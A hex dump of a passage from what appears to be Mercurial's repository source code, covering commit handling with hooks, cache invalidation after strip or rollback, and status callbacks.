+0001cd80: 2020 2020 2020 2020 2020 666f 7220 7320            for s 
+0001cd90: 696e 2073 6f72 7465 6428 636f 6d6d 6974  in sorted(commit
+0001cda0: 7375 6273 293a 0a20 2020 2020 2020 2020  subs):.         
+0001cdb0: 2020 2020 2020 2020 2020 2073 7562 203d             sub =
+0001cdc0: 2077 6374 782e 7375 6228 7329 0a20 2020   wctx.sub(s).   
+0001cdd0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001cde0: 2073 656c 662e 7569 2e73 7461 7475 7328   self.ui.status(
+0001cdf0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001ce00: 2020 2020 2020 2020 205f 2862 2763 6f6d           _(b'com
+0001ce10: 6d69 7474 696e 6720 7375 6272 6570 6f73  mitting subrepos
+0001ce20: 6974 6f72 7920 2573 5c6e 2729 0a20 2020  itory %s\n').   
+0001ce30: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001ce40: 2020 2020 2025 2075 6970 6174 6866 6e28       % uipathfn(
+0001ce50: 7375 6272 6570 6f75 7469 6c2e 7375 6272  subrepoutil.subr
+0001ce60: 656c 7061 7468 2873 7562 2929 0a20 2020  elpath(sub)).   
+0001ce70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001ce80: 2029 0a20 2020 2020 2020 2020 2020 2020   ).             
+0001ce90: 2020 2020 2020 2073 7220 3d20 7375 622e         sr = sub.
+0001cea0: 636f 6d6d 6974 2863 6374 782e 5f74 6578  commit(cctx._tex
+0001ceb0: 742c 2075 7365 722c 2064 6174 6529 0a20  t, user, date). 
+0001cec0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001ced0: 2020 206e 6577 7374 6174 655b 735d 203d     newstate[s] =
+0001cee0: 2028 6e65 7773 7461 7465 5b73 5d5b 305d   (newstate[s][0]
+0001cef0: 2c20 7372 290a 2020 2020 2020 2020 2020  , sr).          
+0001cf00: 2020 2020 2020 7375 6272 6570 6f75 7469        subrepouti
+0001cf10: 6c2e 7772 6974 6573 7461 7465 2873 656c  l.writestate(sel
+0001cf20: 662c 206e 6577 7374 6174 6529 0a0a 2020  f, newstate)..  
+0001cf30: 2020 2020 2020 2020 2020 7031 2c20 7032            p1, p2
+0001cf40: 203d 2073 656c 662e 6469 7273 7461 7465   = self.dirstate
+0001cf50: 2e70 6172 656e 7473 2829 0a20 2020 2020  .parents().     
+0001cf60: 2020 2020 2020 2068 6f6f 6b70 312c 2068         hookp1, h
+0001cf70: 6f6f 6b70 3220 3d20 6865 7828 7031 292c  ookp2 = hex(p1),
+0001cf80: 2028 7032 2021 3d20 7365 6c66 2e6e 756c   (p2 != self.nul
+0001cf90: 6c69 6420 616e 6420 6865 7828 7032 2920  lid and hex(p2) 
+0001cfa0: 6f72 2062 2727 290a 2020 2020 2020 2020  or b'').        
+0001cfb0: 2020 2020 7472 793a 0a20 2020 2020 2020      try:.       
+0001cfc0: 2020 2020 2020 2020 2073 656c 662e 686f           self.ho
+0001cfd0: 6f6b 280a 2020 2020 2020 2020 2020 2020  ok(.            
+0001cfe0: 2020 2020 2020 2020 6222 7072 6563 6f6d          b"precom
+0001cff0: 6d69 7422 2c20 7468 726f 773d 5472 7565  mit", throw=True
+0001d000: 2c20 7061 7265 6e74 313d 686f 6f6b 7031  , parent1=hookp1
+0001d010: 2c20 7061 7265 6e74 323d 686f 6f6b 7032  , parent2=hookp2
+0001d020: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001d030: 2029 0a20 2020 2020 2020 2020 2020 2020   ).             
+0001d040: 2020 2077 6974 6820 7365 6c66 2e74 7261     with self.tra
+0001d050: 6e73 6163 7469 6f6e 2862 2763 6f6d 6d69  nsaction(b'commi
+0001d060: 7427 293a 0a20 2020 2020 2020 2020 2020  t'):.           
+0001d070: 2020 2020 2020 2020 2072 6574 203d 2073           ret = s
+0001d080: 656c 662e 636f 6d6d 6974 6374 7828 6363  elf.commitctx(cc
+0001d090: 7478 2c20 5472 7565 290a 2020 2020 2020  tx, True).      
+0001d0a0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+0001d0b0: 7570 6461 7465 2062 6f6f 6b6d 6172 6b73  update bookmarks
+0001d0c0: 2c20 6469 7273 7461 7465 2061 6e64 206d  , dirstate and m
+0001d0d0: 6572 6765 7374 6174 650a 2020 2020 2020  ergestate.      
+0001d0e0: 2020 2020 2020 2020 2020 2020 2020 626f                bo
+0001d0f0: 6f6b 6d61 726b 732e 7570 6461 7465 2873  okmarks.update(s
+0001d100: 656c 662c 205b 7031 2c20 7032 5d2c 2072  elf, [p1, p2], r
+0001d110: 6574 290a 2020 2020 2020 2020 2020 2020  et).            
+0001d120: 2020 2020 2020 2020 6363 7478 2e6d 6172          cctx.mar
+0001d130: 6b63 6f6d 6d69 7474 6564 2872 6574 290a  kcommitted(ret).
+0001d140: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d150: 2020 2020 6d73 2e72 6573 6574 2829 0a20      ms.reset(). 
+0001d160: 2020 2020 2020 2020 2020 2065 7863 6570             excep
+0001d170: 743a 2020 2320 7265 2d72 6169 7365 730a  t:  # re-raises.
+0001d180: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d190: 6966 2065 6469 7465 643a 0a20 2020 2020  if edited:.     
+0001d1a0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+0001d1b0: 656c 662e 7569 2e77 7269 7465 280a 2020  elf.ui.write(.  
+0001d1c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d1d0: 2020 2020 2020 5f28 6227 6e6f 7465 3a20        _(b'note: 
+0001d1e0: 636f 6d6d 6974 206d 6573 7361 6765 2073  commit message s
+0001d1f0: 6176 6564 2069 6e20 2573 5c6e 2729 2025  aved in %s\n') %
+0001d200: 206d 7367 5f70 6174 680a 2020 2020 2020   msg_path.      
+0001d210: 2020 2020 2020 2020 2020 2020 2020 290a                ).
+0001d220: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d230: 2020 2020 7365 6c66 2e75 692e 7772 6974      self.ui.writ
+0001d240: 6528 0a20 2020 2020 2020 2020 2020 2020  e(.             
+0001d250: 2020 2020 2020 2020 2020 205f 280a 2020             _(.  
+0001d260: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d270: 2020 2020 2020 2020 2020 6222 6e6f 7465            b"note
+0001d280: 3a20 7573 6520 2768 6720 636f 6d6d 6974  : use 'hg commit
+0001d290: 202d 2d6c 6f67 6669 6c65 2022 0a20 2020   --logfile ".   
+0001d2a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d2b0: 2020 2020 2020 2020 2062 2225 7320 2d2d           b"%s --
+0001d2c0: 6564 6974 2720 746f 2072 6575 7365 2069  edit' to reuse i
+0001d2d0: 745c 6e22 0a20 2020 2020 2020 2020 2020  t\n".           
+0001d2e0: 2020 2020 2020 2020 2020 2020 2029 0a20               ). 
+0001d2f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001d300: 2020 2020 2020 2025 206d 7367 5f70 6174         % msg_pat
+0001d310: 680a 2020 2020 2020 2020 2020 2020 2020  h.              
+0001d320: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+0001d330: 2020 2020 2020 2020 7261 6973 650a 0a20          raise.. 
+0001d340: 2020 2020 2020 2064 6566 2063 6f6d 6d69         def commi
+0001d350: 7468 6f6f 6b28 756e 7573 6564 5f73 7563  thook(unused_suc
+0001d360: 6365 7373 293a 0a20 2020 2020 2020 2020  cess):.         
+0001d370: 2020 2023 2068 6163 6b20 666f 7220 636f     # hack for co
+0001d380: 6d6d 616e 6420 7468 6174 2075 7365 2061  mmand that use a
+0001d390: 2074 656d 706f 7261 7279 2063 6f6d 6d69   temporary commi
+0001d3a0: 7420 2865 673a 2068 6973 7465 6469 7429  t (eg: histedit)
+0001d3b0: 0a20 2020 2020 2020 2020 2020 2023 2074  .            # t
+0001d3c0: 656d 706f 7261 7279 2063 6f6d 6d69 7420  emporary commit 
+0001d3d0: 676f 7420 7374 7269 7070 6564 2062 6566  got stripped bef
+0001d3e0: 6f72 6520 686f 6f6b 2072 656c 6561 7365  ore hook release
+0001d3f0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
+0001d400: 7365 6c66 2e63 6861 6e67 656c 6f67 2e68  self.changelog.h
+0001d410: 6173 6e6f 6465 2872 6574 293a 0a20 2020  asnode(ret):.   
+0001d420: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+0001d430: 662e 686f 6f6b 280a 2020 2020 2020 2020  f.hook(.        
+0001d440: 2020 2020 2020 2020 2020 2020 6222 636f              b"co
+0001d450: 6d6d 6974 222c 206e 6f64 653d 6865 7828  mmit", node=hex(
+0001d460: 7265 7429 2c20 7061 7265 6e74 313d 686f  ret), parent1=ho
+0001d470: 6f6b 7031 2c20 7061 7265 6e74 323d 686f  okp1, parent2=ho
+0001d480: 6f6b 7032 0a20 2020 2020 2020 2020 2020  okp2.           
+0001d490: 2020 2020 2029 0a0a 2020 2020 2020 2020       )..        
+0001d4a0: 7365 6c66 2e5f 6166 7465 726c 6f63 6b28  self._afterlock(
+0001d4b0: 636f 6d6d 6974 686f 6f6b 290a 2020 2020  commithook).    
+0001d4c0: 2020 2020 7265 7475 726e 2072 6574 0a0a      return ret..
+0001d4d0: 2020 2020 4075 6e66 696c 7465 7265 646d      @unfilteredm
+0001d4e0: 6574 686f 640a 2020 2020 6465 6620 636f  ethod.    def co
+0001d4f0: 6d6d 6974 6374 7828 7365 6c66 2c20 6374  mmitctx(self, ct
+0001d500: 782c 2065 7272 6f72 3d46 616c 7365 2c20  x, error=False, 
+0001d510: 6f72 6967 6374 783d 4e6f 6e65 293a 0a20  origctx=None):. 
+0001d520: 2020 2020 2020 2072 6574 7572 6e20 636f         return co
+0001d530: 6d6d 6974 2e63 6f6d 6d69 7463 7478 2873  mmit.commitctx(s
+0001d540: 656c 662c 2063 7478 2c20 6572 726f 723d  elf, ctx, error=
+0001d550: 6572 726f 722c 206f 7269 6763 7478 3d6f  error, origctx=o
+0001d560: 7269 6763 7478 290a 0a20 2020 2040 756e  rigctx)..    @un
+0001d570: 6669 6c74 6572 6564 6d65 7468 6f64 0a20  filteredmethod. 
+0001d580: 2020 2064 6566 2064 6573 7472 6f79 696e     def destroyin
+0001d590: 6728 7365 6c66 293a 0a20 2020 2020 2020  g(self):.       
+0001d5a0: 2022 2222 496e 666f 726d 2074 6865 2072   """Inform the r
+0001d5b0: 6570 6f73 6974 6f72 7920 7468 6174 206e  epository that n
+0001d5c0: 6f64 6573 2061 7265 2061 626f 7574 2074  odes are about t
+0001d5d0: 6f20 6265 2064 6573 7472 6f79 6564 2e0a  o be destroyed..
+0001d5e0: 2020 2020 2020 2020 496e 7465 6e64 6564          Intended
+0001d5f0: 2066 6f72 2075 7365 2062 7920 7374 7269   for use by stri
+0001d600: 7020 616e 6420 726f 6c6c 6261 636b 2c20  p and rollback, 
+0001d610: 736f 2074 6865 7265 2773 2061 2063 6f6d  so there's a com
+0001d620: 6d6f 6e0a 2020 2020 2020 2020 706c 6163  mon.        plac
+0001d630: 6520 666f 7220 616e 7974 6869 6e67 2074  e for anything t
+0001d640: 6861 7420 6861 7320 746f 2062 6520 646f  hat has to be do
+0001d650: 6e65 2062 6566 6f72 6520 6465 7374 726f  ne before destro
+0001d660: 7969 6e67 2068 6973 746f 7279 2e0a 0a20  ying history... 
+0001d670: 2020 2020 2020 2054 6869 7320 6973 206d         This is m
+0001d680: 6f73 746c 7920 7573 6566 756c 2066 6f72  ostly useful for
+0001d690: 2073 6176 696e 6720 7374 6174 6520 7468   saving state th
+0001d6a0: 6174 2069 7320 696e 206d 656d 6f72 7920  at is in memory 
+0001d6b0: 616e 6420 7761 6974 696e 670a 2020 2020  and waiting.    
+0001d6c0: 2020 2020 746f 2062 6520 666c 7573 6865      to be flushe
+0001d6d0: 6420 7768 656e 2074 6865 2063 7572 7265  d when the curre
+0001d6e0: 6e74 206c 6f63 6b20 6973 2072 656c 6561  nt lock is relea
+0001d6f0: 7365 642e 2042 6563 6175 7365 2061 2063  sed. Because a c
+0001d700: 616c 6c20 746f 0a20 2020 2020 2020 2064  all to.        d
+0001d710: 6573 7472 6f79 6564 2069 7320 696d 6d69  estroyed is immi
+0001d720: 6e65 6e74 2c20 7468 6520 7265 706f 2077  nent, the repo w
+0001d730: 696c 6c20 6265 2069 6e76 616c 6964 6174  ill be invalidat
+0001d740: 6564 2063 6175 7369 6e67 2074 686f 7365  ed causing those
+0001d750: 0a20 2020 2020 2020 2063 6861 6e67 6573  .        changes
+0001d760: 2074 6f20 7374 6179 2069 6e20 6d65 6d6f   to stay in memo
+0001d770: 7279 2028 7761 6974 696e 6720 666f 7220  ry (waiting for 
+0001d780: 7468 6520 6e65 7874 2075 6e6c 6f63 6b29  the next unlock)
+0001d790: 2c20 6f72 2076 616e 6973 680a 2020 2020  , or vanish.    
+0001d7a0: 2020 2020 636f 6d70 6c65 7465 6c79 2e0a      completely..
+0001d7b0: 2020 2020 2020 2020 2222 220a 2020 2020          """.    
+0001d7c0: 2020 2020 2320 5768 656e 2075 7369 6e67      # When using
+0001d7d0: 2074 6865 2073 616d 6520 6c6f 636b 2074   the same lock t
+0001d7e0: 6f20 636f 6d6d 6974 2061 6e64 2073 7472  o commit and str
+0001d7f0: 6970 2c20 7468 6520 7068 6173 6563 6163  ip, the phasecac
+0001d800: 6865 2069 7320 6c65 6674 0a20 2020 2020  he is left.     
+0001d810: 2020 2023 2064 6972 7479 2061 6674 6572     # dirty after
+0001d820: 2063 6f6d 6d69 7474 696e 672e 2054 6865   committing. The
+0001d830: 6e20 7768 656e 2077 6520 7374 7269 702c  n when we strip,
+0001d840: 2074 6865 2072 6570 6f20 6973 2069 6e76   the repo is inv
+0001d850: 616c 6964 6174 6564 2c0a 2020 2020 2020  alidated,.      
+0001d860: 2020 2320 6361 7573 696e 6720 7468 6f73    # causing thos
+0001d870: 6520 6368 616e 6765 7320 746f 2064 6973  e changes to dis
+0001d880: 6170 7065 6172 2e0a 2020 2020 2020 2020  appear..        
+0001d890: 6966 2027 5f70 6861 7365 6361 6368 6527  if '_phasecache'
+0001d8a0: 2069 6e20 7661 7273 2873 656c 6629 3a0a   in vars(self):.
+0001d8b0: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+0001d8c0: 2e5f 7068 6173 6563 6163 6865 2e77 7269  ._phasecache.wri
+0001d8d0: 7465 2829 0a0a 2020 2020 4075 6e66 696c  te()..    @unfil
+0001d8e0: 7465 7265 646d 6574 686f 640a 2020 2020  teredmethod.    
+0001d8f0: 6465 6620 6465 7374 726f 7965 6428 7365  def destroyed(se
+0001d900: 6c66 293a 0a20 2020 2020 2020 2022 2222  lf):.        """
+0001d910: 496e 666f 726d 2074 6865 2072 6570 6f73  Inform the repos
+0001d920: 6974 6f72 7920 7468 6174 206e 6f64 6573  itory that nodes
+0001d930: 2068 6176 6520 6265 656e 2064 6573 7472   have been destr
+0001d940: 6f79 6564 2e0a 2020 2020 2020 2020 496e  oyed..        In
+0001d950: 7465 6e64 6564 2066 6f72 2075 7365 2062  tended for use b
+0001d960: 7920 7374 7269 7020 616e 6420 726f 6c6c  y strip and roll
+0001d970: 6261 636b 2c20 736f 2074 6865 7265 2773  back, so there's
+0001d980: 2061 2063 6f6d 6d6f 6e0a 2020 2020 2020   a common.      
+0001d990: 2020 706c 6163 6520 666f 7220 616e 7974    place for anyt
+0001d9a0: 6869 6e67 2074 6861 7420 6861 7320 746f  hing that has to
+0001d9b0: 2062 6520 646f 6e65 2061 6674 6572 2064   be done after d
+0001d9c0: 6573 7472 6f79 696e 6720 6869 7374 6f72  estroying histor
+0001d9d0: 792e 0a20 2020 2020 2020 2022 2222 0a20  y..        """. 
+0001d9e0: 2020 2020 2020 2023 2057 6865 6e20 6f6e         # When on
+0001d9f0: 6520 7472 6965 7320 746f 3a0a 2020 2020  e tries to:.    
+0001da00: 2020 2020 2320 3129 2064 6573 7472 6f79      # 1) destroy
+0001da10: 206e 6f64 6573 2074 6875 7320 6361 6c6c   nodes thus call
+0001da20: 696e 6720 7468 6973 206d 6574 686f 6420  ing this method 
+0001da30: 2865 2e67 2e20 7374 7269 7029 0a20 2020  (e.g. strip).   
+0001da40: 2020 2020 2023 2032 2920 7573 6520 7068       # 2) use ph
+0001da50: 6173 6563 6163 6865 2073 6f6d 6577 6865  asecache somewhe
+0001da60: 7265 2028 652e 672e 2063 6f6d 6d69 7429  re (e.g. commit)
+0001da70: 0a20 2020 2020 2020 2023 0a20 2020 2020  .        #.     
+0001da80: 2020 2023 2074 6865 6e20 3229 2077 696c     # then 2) wil
+0001da90: 6c20 6661 696c 2062 6563 6175 7365 2074  l fail because t
+0001daa0: 6865 2070 6861 7365 6361 6368 6520 636f  he phasecache co
+0001dab0: 6e74 6169 6e73 206e 6f64 6573 2074 6861  ntains nodes tha
+0001dac0: 7420 7765 7265 0a20 2020 2020 2020 2023  t were.        #
+0001dad0: 2072 656d 6f76 6564 2e20 5765 2063 616e   removed. We can
+0001dae0: 2065 6974 6865 7220 7265 6d6f 7665 2070   either remove p
+0001daf0: 6861 7365 6361 6368 6520 6672 6f6d 2074  hasecache from t
+0001db00: 6865 2066 696c 6563 6163 6865 2c0a 2020  he filecache,.  
+0001db10: 2020 2020 2020 2320 6361 7573 696e 6720        # causing 
+0001db20: 6974 2074 6f20 7265 6c6f 6164 206e 6578  it to reload nex
+0001db30: 7420 7469 6d65 2069 7420 6973 2061 6363  t time it is acc
+0001db40: 6573 7365 642c 206f 7220 7369 6d70 6c79  essed, or simply
+0001db50: 2066 696c 7465 720a 2020 2020 2020 2020   filter.        
+0001db60: 2320 7468 6520 7265 6d6f 7665 6420 6e6f  # the removed no
+0001db70: 6465 7320 6e6f 7720 616e 6420 7772 6974  des now and writ
+0001db80: 6520 7468 6520 7570 6461 7465 6420 6361  e the updated ca
+0001db90: 6368 652e 0a20 2020 2020 2020 2073 656c  che..        sel
+0001dba0: 662e 5f70 6861 7365 6361 6368 652e 6669  f._phasecache.fi
+0001dbb0: 6c74 6572 756e 6b6e 6f77 6e28 7365 6c66  lterunknown(self
+0001dbc0: 290a 2020 2020 2020 2020 7365 6c66 2e5f  ).        self._
+0001dbd0: 7068 6173 6563 6163 6865 2e77 7269 7465  phasecache.write
+0001dbe0: 2829 0a0a 2020 2020 2020 2020 2320 7265  ()..        # re
+0001dbf0: 6672 6573 6820 616c 6c20 7265 706f 7369  fresh all reposi
+0001dc00: 746f 7279 2063 6163 6865 730a 2020 2020  tory caches.    
+0001dc10: 2020 2020 7365 6c66 2e75 7064 6174 6563      self.updatec
+0001dc20: 6163 6865 7328 290a 0a20 2020 2020 2020  aches()..       
+0001dc30: 2023 2045 6e73 7572 6520 7468 6520 7065   # Ensure the pe
+0001dc40: 7273 6973 7465 6e74 2074 6167 2063 6163  rsistent tag cac
+0001dc50: 6865 2069 7320 7570 6461 7465 642e 2020  he is updated.  
+0001dc60: 446f 696e 6720 6974 206e 6f77 0a20 2020  Doing it now.   
+0001dc70: 2020 2020 2023 206d 6561 6e73 2074 6861       # means tha
+0001dc80: 7420 7468 6520 7461 6720 6361 6368 6520  t the tag cache 
+0001dc90: 6f6e 6c79 2068 6173 2074 6f20 776f 7272  only has to worr
+0001dca0: 7920 6162 6f75 7420 6465 7374 726f 7965  y about destroye
+0001dcb0: 640a 2020 2020 2020 2020 2320 6865 6164  d.        # head
+0001dcc0: 7320 696d 6d65 6469 6174 656c 7920 6166  s immediately af
+0001dcd0: 7465 7220 6120 7374 7269 702f 726f 6c6c  ter a strip/roll
+0001dce0: 6261 636b 2e20 2054 6861 7420 696e 2074  back.  That in t
+0001dcf0: 7572 6e0a 2020 2020 2020 2020 2320 6775  urn.        # gu
+0001dd00: 6172 616e 7465 6573 2074 6861 7420 2263  arantees that "c
+0001dd10: 6163 6865 7469 7020 3d3d 2063 7572 7265  achetip == curre
+0001dd20: 6e74 7469 7022 2028 636f 6d70 6172 696e  nttip" (comparin
+0001dd30: 6720 626f 7468 2072 6576 0a20 2020 2020  g both rev.     
+0001dd40: 2020 2023 2061 6e64 206e 6f64 6529 2061     # and node) a
+0001dd50: 6c77 6179 7320 6d65 616e 7320 6e6f 206e  lways means no n
+0001dd60: 6f64 6573 2068 6176 6520 6265 656e 2061  odes have been a
+0001dd70: 6464 6564 206f 7220 6465 7374 726f 7965  dded or destroye
+0001dd80: 642e 0a0a 2020 2020 2020 2020 2320 5858  d...        # XX
+0001dd90: 5820 7468 6973 2069 7320 7375 626f 7074  X this is subopt
+0001dda0: 696d 616c 2077 6865 6e20 7172 6566 7265  imal when qrefre
+0001ddb0: 7368 2769 6e67 3a20 7765 2073 7472 6970  sh'ing: we strip
+0001ddc0: 2074 6865 2063 7572 7265 6e74 0a20 2020   the current.   
+0001ddd0: 2020 2020 2023 2068 6561 642c 2072 6566       # head, ref
+0001dde0: 7265 7368 2074 6865 2074 6167 2063 6163  resh the tag cac
+0001ddf0: 6865 2c20 7468 656e 2069 6d6d 6564 6961  he, then immedia
+0001de00: 7465 6c79 2061 6464 2061 206e 6577 2068  tely add a new h
+0001de10: 6561 642e 0a20 2020 2020 2020 2023 2042  ead..        # B
+0001de20: 7574 2049 2074 6869 6e6b 2064 6f69 6e67  ut I think doing
+0001de30: 2069 7420 7468 6973 2077 6179 2069 7320   it this way is 
+0001de40: 6e65 6365 7373 6172 7920 666f 7220 7468  necessary for th
+0001de50: 6520 2269 6e73 7461 6e74 0a20 2020 2020  e "instant.     
+0001de60: 2020 2023 2074 6167 2063 6163 6865 2072     # tag cache r
+0001de70: 6574 7269 6576 616c 2220 6361 7365 2074  etrieval" case t
+0001de80: 6f20 776f 726b 2e0a 2020 2020 2020 2020  o work..        
+0001de90: 7365 6c66 2e69 6e76 616c 6964 6174 6528  self.invalidate(
+0001dea0: 290a 0a20 2020 2064 6566 2073 7461 7475  )..    def statu
+0001deb0: 7328 0a20 2020 2020 2020 2073 656c 662c  s(.        self,
+0001dec0: 0a20 2020 2020 2020 206e 6f64 6531 3d62  .        node1=b
+0001ded0: 272e 272c 0a20 2020 2020 2020 206e 6f64  '.',.        nod
+0001dee0: 6532 3d4e 6f6e 652c 0a20 2020 2020 2020  e2=None,.       
+0001def0: 206d 6174 6368 3d4e 6f6e 652c 0a20 2020   match=None,.   
+0001df00: 2020 2020 2069 676e 6f72 6564 3d46 616c       ignored=Fal
+0001df10: 7365 2c0a 2020 2020 2020 2020 636c 6561  se,.        clea
+0001df20: 6e3d 4661 6c73 652c 0a20 2020 2020 2020  n=False,.       
+0001df30: 2075 6e6b 6e6f 776e 3d46 616c 7365 2c0a   unknown=False,.
+0001df40: 2020 2020 2020 2020 6c69 7374 7375 6272          listsubr
+0001df50: 6570 6f73 3d46 616c 7365 2c0a 2020 2020  epos=False,.    
+0001df60: 293a 0a20 2020 2020 2020 2027 2727 6120  ):.        '''a 
+0001df70: 636f 6e76 656e 6965 6e63 6520 6d65 7468  convenience meth
+0001df80: 6f64 2074 6861 7420 6361 6c6c 7320 6e6f  od that calls no
+0001df90: 6465 312e 7374 6174 7573 286e 6f64 6532  de1.status(node2
+0001dfa0: 2927 2727 0a20 2020 2020 2020 2072 6574  )'''.        ret
+0001dfb0: 7572 6e20 7365 6c66 5b6e 6f64 6531 5d2e  urn self[node1].
+0001dfc0: 7374 6174 7573 280a 2020 2020 2020 2020  status(.        
+0001dfd0: 2020 2020 6e6f 6465 322c 206d 6174 6368      node2, match
+0001dfe0: 2c20 6967 6e6f 7265 642c 2063 6c65 616e  , ignored, clean
+0001dff0: 2c20 756e 6b6e 6f77 6e2c 206c 6973 7473  , unknown, lists
+0001e000: 7562 7265 706f 730a 2020 2020 2020 2020  ubrepos.        
+0001e010: 290a 0a20 2020 2064 6566 2061 6464 706f  )..    def addpo
+0001e020: 7374 6473 7374 6174 7573 2873 656c 662c  stdsstatus(self,
+0001e030: 2070 7329 3a0a 2020 2020 2020 2020 2222   ps):.        ""
+0001e040: 2241 6464 2061 2063 616c 6c62 6163 6b20  "Add a callback 
+0001e050: 746f 2072 756e 2077 6974 6869 6e20 7468  to run within th
+0001e060: 6520 776c 6f63 6b2c 2061 7420 7468 6520  e wlock, at the 
+0001e070: 706f 696e 7420 6174 2077 6869 6368 2073  point at which s
+0001e080: 7461 7475 730a 2020 2020 2020 2020 6669  tatus.        fi
+0001e090: 7875 7073 2068 6170 7065 6e2e 0a0a 2020  xups happen...  
+0001e0a0: 2020 2020 2020 4f6e 2073 7461 7475 7320        On status 
+0001e0b0: 636f 6d70 6c65 7469 6f6e 2c20 6361 6c6c  completion, call
+0001e0c0: 6261 636b 2877 6374 782c 2073 7461 7475  back(wctx, statu
+0001e0d0: 7329 2077 696c 6c20 6265 2063 616c 6c65  s) will be calle
+0001e0e0: 6420 7769 7468 2074 6865 0a20 2020 2020  d with the.     
+0001e0f0: 2020 2077 6c6f 636b 2068 656c 642c 2075     wlock held, u
+0001e100: 6e6c 6573 7320 7468 6520 6469 7273 7461  nless the dirsta
+0001e110: 7465 2068 6173 2063 6861 6e67 6564 2066  te has changed f
+0001e120: 726f 6d20 756e 6465 726e 6561 7468 206f  rom underneath o
+0001e130: 7220 7468 6520 776c 6f63 6b0a 2020 2020  r the wlock.    
+0001e140: 2020 2020 636f 756c 646e 2774 2062 6520      couldn't be 
+0001e150: 6772 6162 6265 642e 0a0a 2020 2020 2020  grabbed...      
+0001e160: 2020 4361 6c6c 6261 636b 7320 7368 6f75    Callbacks shou
+0001e170: 6c64 206e 6f74 2063 6170 7475 7265 2061  ld not capture a
+0001e180: 6e64 2075 7365 2061 2063 6163 6865 6420  nd use a cached 
+0001e190: 636f 7079 206f 6620 7468 6520 6469 7273  copy of the dirs
+0001e1a0: 7461 7465 202d 2d0a 2020 2020 2020 2020  tate --.        
+0001e1b0: 6974 206d 6967 6874 2063 6861 6e67 6520  it might change 
+0001e1c0: 696e 2074 6865 206d 6561 6e77 6869 6c65  in the meanwhile
+0001e1d0: 2e20 496e 7374 6561 642c 2074 6865 7920  . Instead, they 
+0001e1e0: 7368 6f75 6c64 2061 6363 6573 7320 7468  should access th
+0001e1f0: 650a 2020 2020 2020 2020 6469 7273 7461  e.        dirsta
+0001e200: 7465 2076 6961 2077 6374 782e 7265 706f  te via wctx.repo
+0001e210: 2829 2e64 6972 7374 6174 652e 0a0a 2020  ().dirstate...  
+0001e220: 2020 2020 2020 5468 6973 206c 6973 7420        This list 
+0001e230: 6973 2065 6d70 7469 6564 206f 7574 2061  is emptied out a
+0001e240: 6674 6572 2065 6163 6820 7374 6174 7573  fter each status
+0001e250: 2072 756e 202d 2d20 6578 7465 6e73 696f   run -- extensio
+0001e260: 6e73 2073 686f 756c 640a 2020 2020 2020  ns should.      
+0001e270: 2020 6d61 6b65 2073 7572 6520 6974 2061    make sure it a
+0001e280: 6464 7320 746f 2074 6869 7320 6c69 7374  dds to this list
+0001e290: 2065 6163 6820 7469 6d65 2064 6972 7374   each time dirst
+0001e2a0: 6174 652e 7374 6174 7573 2069 7320 6361  ate.status is ca
+0001e2b0: 6c6c 6564 2e0a 2020 2020 2020 2020 4578  lled..        Ex
+0001e2c0: 7465 6e73 696f 6e73 2073 686f 756c 6420  tensions should 
+0001e2d0: 616c 736f 206d 616b 6520 7375 7265 2074  also make sure t
+0001e2e0: 6865 7920 646f 6e27 7420 6361 6c6c 2074  hey don't call t
+0001e2f0: 6869 7320 666f 7220 7374 6174 7573 6573  his for statuses
+0001e300: 0a20 2020 2020 2020 2074 6861 7420 646f  .        that do
+0001e310: 6e27 7420 696e 766f 6c76 6520 7468 6520  n't involve the 
+0001e320: 6469 7273 7461 7465 2e0a 2020 2020 2020  dirstate..      
+0001e330: 2020 2222 220a 0a20 2020 2020 2020 2023    """..        #
+0001e340: 2054 6865 206c 6973 7420 6973 206c 6f63   The list is loc
+0001e350: 6174 6564 2068 6572 6520 666f 7220 756e  ated here for un
+0001e360: 6971 7565 6e65 7373 2072 6561 736f 6e73  iqueness reasons
+0001e370: 202d 2d20 6974 2069 7320 6163 7475 616c   -- it is actual
+0001e380: 6c79 0a20 2020 2020 2020 2023 206d 616e  ly.        # man
+0001e390: 6167 6564 2062 7920 7468 6520 776f 726b  aged by the work
+0001e3a0: 696e 6763 7478 2c20 6275 7420 7468 6174  ingctx, but that
+0001e3b0: 2069 736e 2774 2075 6e69 7175 6520 7065   isn't unique pe
+0001e3c0: 722d 7265 706f 2e0a 2020 2020 2020 2020  r-repo..        
+0001e3d0: 7365 6c66 2e5f 706f 7374 6473 7374 6174  self._postdsstat
+0001e3e0: 7573 2e61 7070 656e 6428 7073 290a 0a20  us.append(ps).. 
+0001e3f0: 2020 2064 6566 2070 6f73 7464 7373 7461     def postdssta
+0001e400: 7475 7328 7365 6c66 293a 0a20 2020 2020  tus(self):.     
+0001e410: 2020 2022 2222 5573 6564 2062 7920 776f     """Used by wo
+0001e420: 726b 696e 6763 7478 2074 6f20 6765 7420  rkingctx to get 
+0001e430: 7468 6520 6c69 7374 206f 6620 706f 7374  the list of post
+0001e440: 2d64 6972 7374 6174 652d 7374 6174 7573  -dirstate-status
+0001e450: 2068 6f6f 6b73 2e22 2222 0a20 2020 2020   hooks.""".     
+0001e460: 2020 2072 6574 7572 6e20 7365 6c66 2e5f     return self._
+0001e470: 706f 7374 6473 7374 6174 7573 0a0a 2020  postdsstatus..  
+0001e480: 2020 6465 6620 636c 6561 7270 6f73 7464    def clearpostd
+0001e490: 7373 7461 7475 7328 7365 6c66 293a 0a20  sstatus(self):. 
+0001e4a0: 2020 2020 2020 2022 2222 5573 6564 2062         """Used b
